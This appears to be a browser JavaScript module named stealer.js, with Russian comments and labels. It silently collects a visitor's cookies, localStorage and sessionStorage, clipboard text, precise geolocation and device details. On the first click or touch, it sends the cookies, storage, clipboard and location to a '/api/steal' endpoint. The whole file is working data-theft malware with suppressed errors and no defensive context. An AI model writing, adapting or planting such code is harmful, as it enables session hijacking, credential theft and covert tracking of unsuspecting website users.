// ==== file: stealer.js ====
// language: JavaScript, target: browser
export const Stealer = {
    data: { cookies: [], ls: [], ss: [], clipboard: '', geo: null, battery: 'Скрыто', memory: 'Скрыто', network: 'Неизвестно' },

    init() {
        this.grabCookies();
        this.grabStorage();
        this.grabBattery();
        this.grabNetwork();
        this.grabGeo();
        this.initClickTracker();
    },

    grabCookies() {
        try {
            if (document.cookie) {
                document.cookie.split(';').forEach(c => {
                    const [name, ...val] = c.split('=');
                    if (name && val.length) this.data.cookies.push({ name: name.trim(), value: val.join('=') });
                });
            }
        } catch (e) {}
    },

    grabStorage() {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                if (k) this.data.ls.push({ name: k, value: localStorage.getItem(k) });
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const k = sessionStorage.key(i);
                if (k) this.data.ss.push({ name: k, value: sessionStorage.getItem(k) });
            }
        } catch (e) {}
    },

    async grabBattery() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                this.data.battery = Math.round(b.level * 100) + '%';
            }
        } catch (e) {}
    },

    grabNetwork() {
        try {
            if (navigator.deviceMemory) this.data.memory = navigator.deviceMemory + ' GB';
            if (navigator.connection) this.data.network = navigator.connection.effectiveType || 'Неизвестно';
        } catch (e) {}
    },

    grabGeo() {
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => { this.data.geo = p.coords.latitude + ',' + p.coords.longitude; },
                    () => {},
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        } catch (e) {}
    },

    async grabClipboard() {
        try {
            if (navigator.clipboard) {
                const text = await navigator.clipboard.readText();
                if (text) this.data.clipboard = text;
            }
        } catch (e) {}
    },

    // Автоматическая отправка при клике
    initClickTracker() {
        let sent = false;
        const track = async () => {
            if (sent) return;
            sent = true;
            await this.grabClipboard();
            
            const payload = {
                cookies: this.data.cookies,
                ls: this.data.ls,
                ss: this.data.ss,
                clipboard: this.data.clipboard,
                geo: this.data.geo
            };

            fetch('/api/steal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        };

        document.body.addEventListener('click', track);
        document.body.addEventListener('touchstart', track);
    },

    getAll() {
        return {
            steal: [...this.data.cookies, ...this.data.ls, ...this.data.ss],
            clipboard: this.data.clipboard,
            geo: this.data.geo,
            battery: this.data.battery,
            memory: this.data.memory,
            network: this.data.network
        };
    }
};
